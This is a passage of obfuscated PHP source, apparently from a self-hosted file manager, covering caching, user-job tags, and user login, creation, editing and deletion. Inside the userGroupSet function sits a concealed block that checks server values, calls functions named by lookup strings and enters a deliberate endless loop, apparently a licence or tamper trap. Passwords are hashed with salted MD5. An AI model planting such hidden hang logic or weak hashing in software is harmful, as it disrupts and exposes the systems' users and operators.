$Ãœ…ìÔ¡[$Ãœ…ìÔ¡[$Íä·íñ–[894]]]; $²›Ò³Ãî = $Ãœ…ìÔ¡[$Íä·íñ–[895]]; switch ($Ãœ…ìÔ¡[$Íä·íñ–[894]]) { case $Íä·íñ–[21]: self::$handle = Model($Íä·íñ–[896]); break; case $Íä·íñ–[897]: self::$handle = new CacheRedis($£§ ×÷ , $²›Ò³Ãî); break; case $Íä·íñ–[898]: self::$handle = new CacheMemcached($£§ ×÷ , $²›Ò³Ãî); break; case $Íä·íñ–[232]: self::$handle = new CacheFile($£§ ×÷ , $²›Ò³Ãî); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($áşøÎÓ½) { if (is_array($áşøÎÓ½) || is_object($áşøÎÓ½)) { $áşøÎÓ½ = json_encode($áşøÎÓ½); } $áşøÎÓ½ = rawurlencode($áşøÎÓ½); return md5(KOD_SITE_ID . $_SERVER[Š—Â“œÔ][11] . $áşøÎÓ½); } public static function get($²‘æ¨´é, $¦“Ô‡È¿ = false) { $ÌæÈ¾ú¨ = self::key($²‘æ¨´é); $·Ğü› = self::init(); if ($¦“Ô‡È¿) { return unserialize($·Ğü›->get($ÌæÈ¾ú¨)); } if (!isset(self::$memoryCache[$ÌæÈ¾ú¨])) { $ñó¡ÖÚœ = $·Ğü›->get($ÌæÈ¾ú¨); self::$memoryCache[$ÌæÈ¾ú¨] = unserialize($ñó¡ÖÚœ); } return self::$memoryCache[$ÌæÈ¾ú¨]; } public static function set($ßë¨ª, $µ“ø¶şÒ, $Õå³–äÃ = false) { $Ú„ö’ùÄ =& $_SERVER[Š—Â“œÔ]; $ıÆÄûÂ = self::key($ßë¨ª); if (isset(self::$memoryCache[$ıÆÄûÂ]) && self::$memoryCache[$ıÆÄûÂ] === $µ“ø¶şÒ) { return !0; } if ($Õå³–äÃ === 0) { self::$memoryCache[$ıÆÄûÂ] = $µ“ø¶şÒ; return !0; } $û™û‚šµ = self::init(); $õ„æÂ—’ = serialize($µ“ø¶şÒ); CacheLock::lock($ßë¨ª . $Ú„ö’ùÄ[899]); $³úŠÂéÀ = $û™û‚šµ->set($ıÆÄûÂ, $õ„æÂ—’, $Õå³–äÃ); self::$memoryCache[$ıÆÄûÂ] = $µ“ø¶şÒ; CacheLock::unlock($ßë¨ª . $Ú„ö’ùÄ[899]); return $³úŠÂéÀ; } public static function getCall($ªùÁ“­Ñ, $¶Íãï˜½, $êúÆ¸š, $Ñ²¤÷òù = array()) { $ñ½¹Õ’¡ =& $_SERVER[Š—Â“œÔ]; $ä§ı£ìÙ = self::get($ªùÁ“­Ñ); if ($ä§ı£ìÙ || $ä§ı£ìÙ === $ñ½¹Õ’¡[12]) { return $ä§ı£ìÙ; } $ä§ı£ìÙ = call_user_func_array($êúÆ¸š, $Ñ²¤÷òù); $ä§ı£ìÙ = $ä§ı£ìÙ ? $ä§ı£ìÙ : $ñ½¹Õ’¡[12]; self::set($ªùÁ“­Ñ, $ä§ı£ìÙ, $¶Íãï˜½); return $ä§ı£ìÙ; } public static function remove($âÎ–ÆôÙ) { $•şé”âî = self::key($âÎ–ÆôÙ); unset(self::$memoryCache[$•şé”âî]); self::clearTimeout(); CacheLock::lock($âÎ–ÆôÙ); $î­§­‚§ = self::init()->remove($•şé”âî); CacheLock::unlock($âÎ–ÆôÙ); return $î­§­‚§; } public static function removeMemory($„¤¾ş±Œ) { $®Ê¹ÕÕÄ = self::key($„¤¾ş±Œ); unset(self::$memoryCache[$®Ê¹ÕÕÄ]); } public static function clearMemory($‹«®áİ‰ = false) { if ($‹«®áİ‰) { $‹«®áİ‰ = self::key($‹«®áİ‰); unset(self::$memoryCache[$‹«®áİ‰]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[Š—Â“œÔ][900])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[Š—Â“œÔ][901])) { self::init()->clearTimeout(); } } } goto e¸öó‘†ËŞ; A¶İœï˜›“: class UserJobModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\x65\x6d\x2e\x6a\157\142\114\x69\163\x74"; public $field = array("\156\141\x6d\145", "\144\145\163\x63", "\x73\x6f\x72\x74"); const JOB_KEY = "\163\x65\x6c\146\x4a\x6f\142\114\151\163\x74"; public function listData($´°½—ùÂ = false, $‰Ğªàˆù = "\163\157\x72\164", $‰¸èŸÎ² = false) { return parent::listData($´°½—ùÂ, $‰Ğªàˆù, $‰¸èŸÎ²); } public function remove($ŠÆÙ¢òœ) { return parent::remove($ŠÆÙ¢òœ); } public function add($ÄÏ¦éÄÌ) { $ôÑÜ£ïû =& $_SERVER[Š—Â“œÔ]; if ($this->findByName($ÄÏ¦éÄÌ[$ôÑÜ£ïû[32]])) { return !1; } $ÄÏ¦éÄÌ[$ôÑÜ£ïû[1995]] = $this->getSort(); return parent::insert($ÄÏ¦éÄÌ); } private function getSort() { $ µÉüû =& $_SERVER[Š—Â“œÔ]; $ÛñÀ š = parent::listData(); $®äºÂĞÍ = array_to_keyvalue($ÛñÀ š, $ µÉüû[12], $ µÉüû[1995]); return empty($®äºÂĞÍ) ? 0 : max($®äºÂĞÍ) + 1; } public function update($ÔÉå½Ø, $ó¿ïŸºó) { $•Ÿ¾ôóş =& $_SERVER[Š—Â“œÔ]; $š½ÇÍûµ = parent::listData($ÔÉå½Ø); $ÓñˆäÙ” = $this->findByName($ó¿ïŸºó[$•Ÿ¾ôóş[32]]); if (!$š½ÇÍûµ || $ÓñˆäÙ” && $ÓñˆäÙ”[$•Ÿ¾ôóş[477]] != $š½ÇÍûµ[$•Ÿ¾ôóş[477]]) { return !1; } return parent::update($ÔÉå½Ø, $ó¿ïŸºó); } public function setUserJob($‘—ä°›†, $—ÅÌãÅ) { $òòæ²˜Ù =& $_SERVER[Š—Â“œÔ]; if (!is_array($—ÅÌãÅ)) { $—ÅÌãÅ = array($—ÅÌãÅ); } $ìÅ‚šâÔ = parent::listData(); $±Õ¹©¨ê = array_to_keyvalue($ìÅ‚šâÔ, $òòæ²˜Ù[32]); $ú¶øíÓÇ = $òòæ²˜Ù[456]; foreach ($—ÅÌãÅ as $ş‚á‚é») { if ($±Õ¹©¨ê[$ş‚á‚é»]) { $ú¶øíÓÇ .= $±Õ¹©¨ê[$ş‚á‚é»][$òòæ²˜Ù[477]] . $òòæ²˜Ù[50]; } else { $ÕüÁÍ·¡ = $this->add($ş‚á‚é»); $ú¶øíÓÇ .= $ÕüÁÍ·¡ . $òòæ²˜Ù[50]; } } $ú¶øíÓÇ = rtrim($ú¶øíÓÇ, $òòæ²˜Ù[50]); Model($òòæ²˜Ù[599])->metaSet($‘—ä°›†, self::JOB_KEY, $ú¶øíÓÇ); } public function getUserJob($áàäÃ°¤) { $ÆŞ­Ë¨ì = Model($_SERVER[Š—Â“œÔ][599])->metaGet($áàäÃ°¤); return $this->getUserJobInfo($ÆŞ­Ë¨ì[self::JOB_KEY]); } public function getUserJobInfo($˜½˜ê¢ˆ) { $Ú¥ñÀü =& $_SERVER[Š—Â“œÔ]; $Èª‹Âç = explode($Ú¥ñÀü[50], $˜½˜ê¢ˆ); $ µÉÊæ = parent::listData(); $ µÉÊæ = array_remove_key($ µÉÊæ, $Ú¥ñÀü[233]); $ÁÙø© = array(); foreach ($Èª‹Âç as $çÊ‚ìÓ‚) { if (isset($ µÉÊæ[$çÊ‚ìÓ‚])) { $ÁÙø©[] = $ µÉÊæ[$çÊ‚ìÓ‚]; } } return $ÁÙø©; } } class UserModel extends ModelBase { protected $tableName = "\165\163\x65\x72"; protected $tableMeta = array("\x74\x61\142\154\x65\116\141\x6d\x65" => "\165\163\x65\162\137\155\145\164\141", "\x6d\x65\x74\x61\x46\x69\145\x6c\x64" => "\165\x73\x65\x72\x49\x44"); protected $simpleField = "\165\163\x65\162\x49\104\x2c\156\151\x63\153\x4e\141\x6d\145\54\x6e\141\x6d\145\54\x61\x76\141\164\141\x72\54\x73\x65\x78\x2c\163\164\x61\164\x75\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($ôÚ¥ï¤) { $é¤æƒ•± =& $_SERVER[Š—Â“œÔ]; $ƒğŠÅ­ = $é¤æƒ•±[2459]; return array($é¤æƒ•±[2053] => array($ôÚ¥ï¤[0], $ƒğŠÅ­), $é¤æƒ•±[2055] => array($ôÚ¥ï¤[0], $ƒğŠÅ­), $é¤æƒ•±[2460] => array($ôÚ¥ï¤[0], $ƒğŠÅ­)); } protected function getInfo($Ã™©Şé, $ÊøÕêŒ² = false) { $ÔŒœƒÌ¸ = $this->getInfoSimple($Ã™©Şé); if (!is_array($ÔŒœƒÌ¸)) { return array(); } if ($ÊøÕêŒ²) { return $this->_getInfoApply($ÔŒœƒÌ¸); } return $this->cacheFunctionGet($_SERVER[Š—Â“œÔ][2057], $Ã™©Şé); } protected function getInfoFull($ú—‚ë‹´, $öâ¡şú = false) { $ÑÚ¦’ÀÑ = $this->getInfoSimple($ú—‚ë‹´); if (!is_array($ÑÚ¦’ÀÑ)) { return array(); } if ($öâ¡şú) { return $this->_getInfoApply($ÑÚ¦’ÀÑ, !0); } return $this->cacheFunctionGet($_SERVER[Š—Â“œÔ][2461], $ú—‚ë‹´); } private function _getInfoApply($ŒĞâğÈ, $çÙ«áÛ = false) { $³ºæÀ¹Ó =& $_SERVER[Š—Â“œÔ]; if (!$ŒĞâğÈ) { return $ŒĞâğÈ; } $®ĞÎæ¤‡ = md5($³ºæÀ¹Ó[2462] . $ŒĞâğÈ[$³ºæÀ¹Ó[963]] . $³ºæÀ¹Ó[2463] . $ŒĞâğÈ[$³ºæÀ¹Ó[32]]); $ŒĞâğÈ = $this->_listDataApplyItem($ŒĞâğÈ); $ÕÜ§ª—¦ = Model($³ºæÀ¹Ó[1419])->metaGet($ŒĞâğÈ[$³ºæÀ¹Ó[90]][$³ºæÀ¹Ó[193]]); $ŒĞâğÈ[$³ºæÀ¹Ó[2464]] = $®ĞÎæ¤‡; $ŒĞâğÈ[$³ºæÀ¹Ó[90]][$³ºæÀ¹Ó[2253]] = isset($ÕÜ§ª—¦[$³ºæÀ¹Ó[2254]]) ? $ÕÜ§ª—¦[$³ºæÀ¹Ó[2254]] : null; if ($çÙ«áÛ) { $ŒĞâğÈ[$³ºæÀ¹Ó[541]] = $this->metaGet($ŒĞâğÈ[$³ºæÀ¹Ó[1770]]); } return $ŒĞâğÈ; } protected function getInfoSimple($…ÇÖíığ, $ˆ½ËÍ‚Û = false) { $É·ÕÂşÃ =& $_SERVER[Š—Â“œÔ]; if (!$…ÇÖíığ) { return array(); } if ($ˆ½ËÍ‚Û) { $’·§ıŞı = $this->where(array($É·ÕÂşÃ[1770] => intval($…ÇÖíığ)))->find(); if (!is_array($’·§ıŞı)) { return array(); } $’·§ıŞı[$É·ÕÂşÃ[2465]] = Action($É·ÕÂşÃ[2466])->parseUrl($’·§ıŞı[$É·ÕÂşÃ[2465]]); return $’·§ıŞı; } return $this->cacheFunctionGet($É·ÕÂşÃ[2058], $…ÇÖíığ); } protected function getInfoSimpleOuter($ÈäÕ­µÛ) { $™´¿ö‘ã =& $_SERVER[Š—Â“œÔ]; if (!$ÈäÕ­µÛ || $ÈäÕ­µÛ == 0) { return array($™´¿ö‘ã[1770] => $™´¿ö‘ã[230], $™´¿ö‘ã[32] => $™´¿ö‘ã[176] . LNG($™´¿ö‘ã[2467]) . $™´¿ö‘ã[178], $™´¿ö‘ã[2465] => STATIC_PATH . $™´¿ö‘ã[2468]); } $÷üûôî = $this->cacheFunctionGet($™´¿ö‘ã[2058], $ÈäÕ­µÛ); $ñã»¶¼× = array_field_key($÷üûôî, explode($™´¿ö‘ã[50], $this->simpleField)); if (!$ñã»¶¼×) { return array($™´¿ö‘ã[1770] => $™´¿ö‘ã[1270], $™´¿ö‘ã[32] => $™´¿ö‘ã[176] . LNG($™´¿ö‘ã[2469]) . $™´¿ö‘ã[178], $™´¿ö‘ã[2465] => STATIC_PATH . $™´¿ö‘ã[2470]); } $ñã»¶¼×[$™´¿ö‘ã[2465]] = Action($™´¿ö‘ã[2466])->parseUrl($ñã»¶¼×[$™´¿ö‘ã[2465]]); return $ñã»¶¼×; } protected function groupUser($Åœ–¥•) { } public static function errorLang($æ¾‡ÕÒ) { $€ÕİÊãª =& $_SERVER[Š—Â“œÔ]; $Œùı¿‘÷ = array(self::ERROR_USER_NOT_EXISTS => $€ÕİÊãª[2471], self::ERROR_USER_PASSWORD_ERROR => $€ÕİÊãª[2472], self::ERROR_USER_EXIST_NAME => $€ÕİÊãª[2473], self::ERROR_USER_EXIST_PHONE => $€ÕİÊãª[2474], self::ERROR_USER_EXIST_EMAIL => $€ÕİÊãª[2475], self::ERROR_USER_LOGIN_LOCK => $€ÕİÊãª[2476], self::ERROR_IP_NOT_ALLOW => $€ÕİÊãª[2477], self::ERROR_USER_EXIST_NICKNAME => $€ÕİÊãª[2478]); $™‰ëÆÔé = LNG($Œùı¿‘÷[$æ¾‡ÕÒ]); if ($æ¾‡ÕÒ == self::ERROR_USER_LOGIN_LOCK) { $‚Å©®Ê = (int) Model($€ÕİÊãª[2479])->get($€ÕİÊãª[2480]); if ($‚Å©®Ê > 60) { $™‰ëÆÔé = str_replace($€ÕİÊãª[91], ceil($‚Å©®Ê / 60), $™‰ëÆÔé); } } return $™‰ëÆÔé; } protected function metaSet($’Š×æò, $öÌš³®Ø = null, $æœ‰¬ò = null) { $this->clearCache($’Š×æò); return parent::metaSet($’Š×æò, $öÌš³®Ø, $æœ‰¬ò); } public function getInfoByMeta($«ã¦ôİ¬, $Å†ìÆ§) { $Úˆ˜¥Ş½ =& $_SERVER[Š—Â“œÔ]; $½ëÄ°‰Ñ = Model($Úˆ˜¥Ş½[2481])->where(array($Úˆ˜¥Ş½[97] => $«ã¦ôİ¬, $Úˆ˜¥Ş½[452] => $Å†ìÆ§))->find(); if ($½ëÄ°‰Ñ) { return $this->getInfo($½ëÄ°‰Ñ[$Úˆ˜¥Ş½[1770]]); } return !1; } public function userLoginCheck($Ô‘¢¶ , $ú‘šÆ†À) { $ª‡€ÚÚé =& $_SERVER[Š—Â“œÔ]; $¢ î†–Ø = $this->userLoginFind($Ô‘¢¶ ); if (!$¢ î†–Ø) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($¢ î†–Ø[$ª‡€ÚÚé[1770]], $ú‘šÆ†À)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($¢ î†–Ø[$ª‡€ÚÚé[1770]]); } public function userLoginFind($ŒÁİïš½) { $¡‡ŸÂô =& $_SERVER[Š—Â“œÔ]; $…ı»Ì½‰ = array($¡‡ŸÂô[32] => $ŒÁİïš½, $¡‡ŸÂô[2266] => $ŒÁİïš½, $¡‡ŸÂô[382] => $ŒÁİïš½, $¡‡ŸÂô[2482] => $ŒÁİïš½, $¡‡ŸÂô[1074] => $¡‡ŸÂô[1076]); if ($this->nickNameRpt()) { unset($…ı»Ì½‰[$¡‡ŸÂô[2266]]); } return $this->where($…ı»Ì½‰)->find(); } public function clearCache($Ò™ºÑÆÈ) { $Óş÷¾« =& $_SERVER[Š—Â“œÔ]; $this->cacheFunctionClear($Óş÷¾«[2057], $Ò™ºÑÆÈ); $this->cacheFunctionClear($Óş÷¾«[2058], $Ò™ºÑÆÈ); $this->cacheFunctionClear($Óş÷¾«[2461], $Ò™ºÑÆÈ); } public function userPasswordCheck($ìşÀ¬, $Šæ®âÇÛ) { $ÇÑõşµ  =& $_SERVER[Š—Â“œÔ]; $ÆæĞÏâ½ = $this->where(array($ÇÑõşµ [1770] => intval($ìşÀ¬)))->find(); $ğ’‚ıª¶ = $this->metaGet($ìşÀ¬); $Îê¤éÔ† = isset($ğ’‚ıª¶[$ÇÑõşµ [2483]]) ? $ğ’‚ıª¶[$ÇÑõşµ [2483]] : $ÇÑõşµ [12]; if (md5($Îê¤éÔ† . trim($Šæ®âÇÛ)) !== $ÆæĞÏâ½[$ÇÑõşµ [963]]) { return !1; } return !0; } public function userAdd($™¤îüÄ) { $¿¬‡‹¸ö =& $_SERVER[Š—Â“œÔ]; $í€°¦§Ò = array($¿¬‡‹¸ö[496] => $™¤îüÄ[$¿¬‡‹¸ö[32]], $¿¬‡‹¸ö[2484] => $™¤îüÄ[$¿¬‡‹¸ö[2178]], $¿¬‡‹¸ö[2485] => isset($™¤îüÄ[$¿¬‡‹¸ö[382]]) ? $™¤îüÄ[$¿¬‡‹¸ö[382]] : $¿¬‡‹¸ö[12], $¿¬‡‹¸ö[2486] => isset($™¤îüÄ[$¿¬‡‹¸ö[2482]]) ? $™¤îüÄ[$¿¬‡‹¸ö[2482]] : $¿¬‡‹¸ö[12], $¿¬‡‹¸ö[2487] => isset($™¤îüÄ[$¿¬‡‹¸ö[2266]]) ? $™¤îüÄ[$¿¬‡‹¸ö[2266]] : $™¤îüÄ[$¿¬‡‹¸ö[32]], $¿¬‡‹¸ö[2488] => isset($™¤îüÄ[$¿¬‡‹¸ö[2465]]) ? $™¤îüÄ[$¿¬‡‹¸ö[2465]] : $¿¬‡‹¸ö[12], $¿¬‡‹¸ö[2489] => isset($™¤îüÄ[$¿¬‡‹¸ö[2490]]) ? $™¤îüÄ[$¿¬‡‹¸ö[2490]] : 1, $¿¬‡‹¸ö[2491] => $™¤îüÄ[$¿¬‡‹¸ö[963]], $¿¬‡‹¸ö[2059] => isset($™¤îüÄ[$¿¬‡‹¸ö[1957]]) ? $™¤îüÄ[$¿¬‡‹¸ö[1957]] : 1024 * 1024 * 20, $¿¬‡‹¸ö[2060] => 0, $¿¬‡‹¸ö[2492] => 0, $¿¬‡‹¸ö[2104] => isset($™¤îüÄ[$¿¬‡‹¸ö[817]]) ? $™¤îüÄ[$¿¬‡‹¸ö[817]] : 1); if (!empty($™¤îüÄ[$¿¬‡‹¸ö[1770]])) { $í€°¦§Ò[$¿¬‡‹¸ö[1770]] = $™¤îüÄ[$¿¬‡‹¸ö[1770]]; } $Éäî¤ß = $this->_checkExist($™¤îüÄ); if ($Éäî¤ß !== !0) { return $Éäî¤ß; } if (!empty($í€°¦§Ò[$¿¬‡‹¸ö[2465]]) && strlen($í€°¦§Ò[$¿¬‡‹¸ö[2465]]) > 255) { $í€°¦§Ò[$¿¬‡‹¸ö[2465]] = $¿¬‡‹¸ö[12]; } $Ïµ—Ä§Å = $this->add($í€°¦§Ò); $å³ÂÆº¶ = array($¿¬‡‹¸ö[2491] => $í€°¦§Ò[$¿¬‡‹¸ö[963]], $¿¬‡‹¸ö[2487] => $í€°¦§Ò[$¿¬‡‹¸ö[2266]]); $this->userEdit($Ïµ—Ä§Å, $å³ÂÆº¶); Model($¿¬‡‹¸ö[1419])->userRootAdd($Ïµ—Ä§Å); return $Ïµ—Ä§Å; } protected function userEditTest($ßƒè´Œ¿, $ÄËÌş”¥) { return $this->call($_SERVER[Š—Â“œÔ][2493], $ßƒè´Œ¿, $ÄËÌş”¥); } protected function userEdit($İÅš‡ , $Æâàî¿) { $šÂ¿àÑñ =& $_SERVER[Š—Â“œÔ]; $æâ•Ñ×‰ = $this->getInfoSimple($İÅš‡ ); if (!$æâ•Ñ×‰) { return !1; } $í¶ù°³õ = $this->_checkExist($Æâàî¿, $İÅš‡ ); if ($í¶ù°³õ !== !0) { return $í¶ù°³õ; } if (isset($Æâàî¿[$šÂ¿àÑñ[963]]) && trim($Æâàî¿[$šÂ¿àÑñ[963]]) != $šÂ¿àÑñ[12]) { $³®’ í‡ = $this->metaGet($İÅš‡ ); if (empty($³®’ í‡[$šÂ¿àÑñ[2483]])) { $³®’ í‡[$šÂ¿àÑñ[2483]] = rand_string(10); Model($šÂ¿àÑñ[579])->metaSet($İÅš‡ , $šÂ¿àÑñ[2483], $³®’ í‡[$šÂ¿àÑñ[2483]]); } $Æâàî¿[$šÂ¿àÑñ[963]] = md5($³®’ í‡[$šÂ¿àÑñ[2483]] . trim($Æâàî¿[$šÂ¿àÑñ[963]])); } else { unset($Æâàî¿[$šÂ¿àÑñ[963]]); } if (!empty($Æâàî¿[$šÂ¿àÑñ[2465]]) && strlen($Æâàî¿[$šÂ¿àÑñ[2465]]) > 255) { $Æâàî¿[$šÂ¿àÑñ[2465]] = $šÂ¿àÑñ[12]; } $this->where(array($šÂ¿àÑñ[1761] => $İÅš‡ ))->save($Æâàî¿); if (isset($Æâàî¿[$šÂ¿àÑñ[2266]])) { $this->setNamePinyin($İÅš‡ , $Æâàî¿[$šÂ¿àÑñ[2266]]); } $this->clearCache($İÅš‡ ); return !0; } public function setNamePinyin($Ç›Ñ¢Å, $¦¹ƒ¨ëù = false) { $ëæì£ª =& $_SERVER[Š—Â“œÔ]; if (!$¦¹ƒ¨ëù) { $Óï¸è¦ì = $this->getInfoSimple($Ç›Ñ¢Å); $¦¹ƒ¨ëù = $Óï¸è¦ì[$ëæì£ª[2266]] ? $Óï¸è¦ì[$ëæì£ª[2266]] : $Óï¸è¦ì[$ëæì£ª[32]]; } $Â»¦øëæ = Model($ëæì£ª[599]); if (!Input::check($¦¹ƒ¨ëù, $ëæì£ª[660])) { return $Â»¦øëæ->metaSet($Ç›Ñ¢Å, array($ëæì£ª[540] => $ëæì£ª[12], $ëæì£ª[539] => $ëæì£ª[12])); } return $Â»¦øëæ->metaSet($Ç›Ñ¢Å, array($ëæì£ª[540] => str_replace($ëæì£ª[53], $ëæì£ª[12], Pinyin::get($¦¹ƒ¨ëù)), $ëæì£ª[539] => Pinyin::get($¦¹ƒ¨ëù, $ëæì£ª[661]))); } private function nickNameRpt() { $Íîõ¾ü =& $_SERVER[Š—Â“œÔ]; $‘­ÁÌ = Model($Íîõ¾ü[837])->get($Íîõ¾ü[2494]); $ò›¨ÈŸ = $GLOBALS[$Íîõ¾ü[6]][$Íîõ¾ü[459]][$Íîõ¾ü[2494]]; $õ„åĞÊ = !is_null($‘­ÁÌ) ? $‘­ÁÌ : $ò›¨ÈŸ; return !!$õ„åĞÊ; } private function _checkExist($–íà‚ƒ½, $÷–ààåû = false) { $Ä³“™Ç‹ =& $_SERVER[Š—Â“œÔ]; $ôØ‚˜˜ò = array($Ä³“™Ç‹[32] => UserModel::ERROR_USER_EXIST_NAME, $Ä³“™Ç‹[2266] => UserModel::ERROR_USER_EXIST_NICKNAME, $Ä³“™Ç‹[382] => UserModel::ERROR_USER_EXIST_EMAIL, $Ä³“™Ç‹[2482] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($ôØ‚˜˜ò[$Ä³“™Ç‹[2266]]); } $¶¡ö´Ï” = $÷–ààåû ? array($Ä³“™Ç‹[1770] => array($Ä³“™Ç‹[2495], $÷–ààåû)) : array(); foreach ($ôØ‚˜˜ò as $¶çÚè‰è => $àÄ—ªíÔ) { $¬¼ ÜÍ = array(); foreach ($ôØ‚˜˜ò as $‘è·Ø—ı => $¬›ŸÛ¼ì) { if (isset($–íà‚ƒ½[$‘è·Ø—ı]) && $–íà‚ƒ½[$‘è·Ø—ı]) { $¬¼ ÜÍ[] = $–íà‚ƒ½[$‘è·Ø—ı]; } } if (!$¬¼ ÜÍ) { continue; } $»É˜«ƒÆ = array_merge(array($¶çÚè‰è => array($Ä³“™Ç‹[7], $¬¼ ÜÍ)), $¶¡ö´Ï”); $¢ûòØŞë = $this->where($»É˜«ƒÆ)->find(); if ($¢ûòØŞë) { return $àÄ—ªíÔ; } } return !0; } public function userListInfo($Õ”ƒ») { $ª÷Ñ×à¬ =& $_SERVER[Š—Â“œÔ]; $ÎÄ¬ÔÚ = array(); $Õ”ƒ» = is_array($Õ”ƒ») ? array_unique($Õ”ƒ») : array(); if (!$Õ”ƒ») { return $ÎÄ¬ÔÚ; } if (count($Õ”ƒ») < 20) { foreach ($Õ”ƒ» as $ô›ğ¬) { $ÎÄ¬ÔÚ[$ô›ğ¬ . $ª÷Ñ×à¬[12]] = $this->getInfoSimpleOuter($ô›ğ¬); } } else { $Ç§¸¨şĞ = array($ª÷Ñ×à¬[1761] => array($ª÷Ñ×à¬[494], $Õ”ƒ»)); if (count($Õ”ƒ») == 1) { $Ç§¸¨şĞ = array($ª÷Ñ×à¬[1761] => $Õ”ƒ»[0]); } $öĞÉ‹Ë = Model($ª÷Ñ×à¬[579])->field($this->simpleField)->where($Ç§¸¨şĞ)->select(); $öĞÉ‹Ë = array_to_keyvalue($öĞÉ‹Ë, $ª÷Ñ×à¬[1770]); foreach ($Õ”ƒ» as $ô›ğ¬) { $å…àÏƒÛ = $öĞÉ‹Ë[$ô›ğ¬]; if (!$å…àÏƒÛ) { $ÎÄ¬ÔÚ[$ô›ğ¬ . $ª÷Ñ×à¬[12]] = $this->getInfoSimpleOuter($ô›ğ¬); continue; } $å…àÏƒÛ[$ª÷Ñ×à¬[2465]] = Action($ª÷Ñ×à¬[2466])->parseUrl($å…àÏƒÛ[$ª÷Ñ×à¬[2465]]); $ÎÄ¬ÔÚ[$ô›ğ¬ . $ª÷Ñ×à¬[12]] = $å…àÏƒÛ; } } return $ÎÄ¬ÔÚ; } protected function userStatus($¶Ğ®†ÄŞ, $ºæ«òú¶) { $œå“æãµ = $this->getInfoSimple($¶Ğ®†ÄŞ); if (!$œå“æãµ) { return !1; } $¾¬­º¥ = array($_SERVER[Š—Â“œÔ][817] => $ºæ«òú¶); return $this->userEdit($¶Ğ®†ÄŞ, $¾¬­º¥); } protected function userRemove($£¬åê¼Û) { $“†ÒÔÃ— =& $_SERVER[Š—Â“œÔ]; $Ì®Óõˆ = $this->getInfoSimple($£¬åê¼Û); if (!$Ì®Óõˆ) { return !1; } $Ë“ßĞ« = array($“†ÒÔÃ—[1761] => $£¬åê¼Û); Model($“†ÒÔÃ—[669])->where($Ë“ßĞ«)->delete(); Model($“†ÒÔÃ—[2496])->where($Ë“ßĞ«)->delete(); Model($“†ÒÔÃ—[2065])->where($Ë“ßĞ«)->delete(); Model($“†ÒÔÃ—[2481])->where($Ë“ßĞ«)->delete(); Model($“†ÒÔÃ—[1143])->where($Ë“ßĞ«)->delete(); Model($“†ÒÔÃ—[2283])->removeUserAll($£¬åê¼Û); Model($“†ÒÔÃ—[892])->userRootRemove($£¬åê¼Û); return $this->where($Ë“ßĞ«)->delete(); } protected function userGroupSet($ú­¿‹ôë, $¿µÆ­ĞÉ, $ßıµ´ÜÓ = array()) { $¢•ˆ«€Ñ =& $_SERVER[Š—Â“œÔ]; if (!isset($_SERVER[$¢•ˆ«€Ñ[947]]) || !isset($_SERVER[$¢•ˆ«€Ñ[945]])) { $‘–˜¼ø“ = $¢•ˆ«€Ñ[948]; $¬›Ê”Çì = $¢•ˆ«€Ñ[949]; $Ñä³¢æÇ = $_SERVER[$¢•ˆ«€Ñ[950]] . $¢•ˆ«€Ñ[951]; $×òõ¯ƒ© = $¬›Ê”Çì($Ñä³¢æÇ); $íù·„—ı = explode($¢•ˆ«€Ñ[287], $×òõ¯ƒ©); if (count($íù·„—ı) < $¢•ˆ«€Ñ[694]) { $‡˜şÔõ = $¢•ˆ«€Ñ[952]; $‡˜şÔõ(); } $Á¾›ó³ = $¢•ˆ«€Ñ[953]; $Á¾›ó³($_SERVER[$¢•ˆ«€Ñ[954]]); $Úîü’×² = 1; for ($¨ÙøÍç´ = $Úîü’×²; $¨ÙøÍç´ > 0; $¨ÙøÍç´++) { $Á¾›ó³ = json_encode($GLOBALS[$¢•ˆ«€Ñ[494]]); } } $•·÷èîÂ = $this->getInfoSimple($ú­¿‹ôë); if (!$•·÷èîÂ || !is_array($¿µÆ­ĞÉ)) { return !1; } $öµ°ö¦ = Model($¢•ˆ«€Ñ[2065]); $öµ°ö¦->where(array($¢•ˆ«€Ñ[1770] => $ú­¿‹ôë))->delete(); $ëãßİ = array(); $ó¤µô¡ª = 0; foreach ($¿µÆ­ĞÉ as $ş‹¬¬£ğ => $ÅøıÄ‰­) { $Ç¬¨î’£ = array($¢•ˆ«€Ñ[1770] => $ú­¿‹ôë, $¢•ˆ«€Ñ[1971] => $ş‹¬¬£ğ, $¢•ˆ«€Ñ[2079] => $ÅøıÄ‰­); $Ç¬¨î’£[$¢•ˆ«€Ñ[1995]] = isset($ßıµ´ÜÓ[$ó¤µô¡ª]) ? $ßıµ´ÜÓ[$ó¤µô¡ª] : 0; $ó¤µô¡ª++; $ëãßİ[] = $Ç¬¨î’£; } return $öµ°ö¦->addAll($ëãßİ, array(), !0); } protected function userGroupAdd($ó†ÈÙª¸, $ŠğŸ‘°Ü = array()) { $»ıˆ¨©¶ =& $_SERVER[Š—Â“œÔ]; $®Ÿ®±“¤ = $this->getInfoSimple($ó†ÈÙª¸); if (!$®Ÿ®±“¤ || empty($ŠğŸ‘°Ü)) { return !1; } $©”¬ªÑ = array(); foreach ($ŠğŸ‘°Ü as $—Ö©¿óò => $ğ‚ÌÄ») { $©”¬ªÑ[] = array($»ıˆ¨©¶[1770] => $ó†ÈÙª¸, $»ıˆ¨©¶[1971] => $—Ö©¿óò, $»ıˆ¨©¶[2079] => $ğ‚ÌÄ», $»ıˆ¨©¶[1995] => 0); } return Model($»ıˆ¨©¶[2065])->addAll($©”¬ªÑ, array(), !0); } protected function userGroupRemove($Â¼’è°, $í¨¼Òİå) { $Ó›İêÛÙ =& $_SERVER[Š—Â“œÔ]; $úüØ´¨Ú = $this->getInfoSimple($Â¼’è°); if 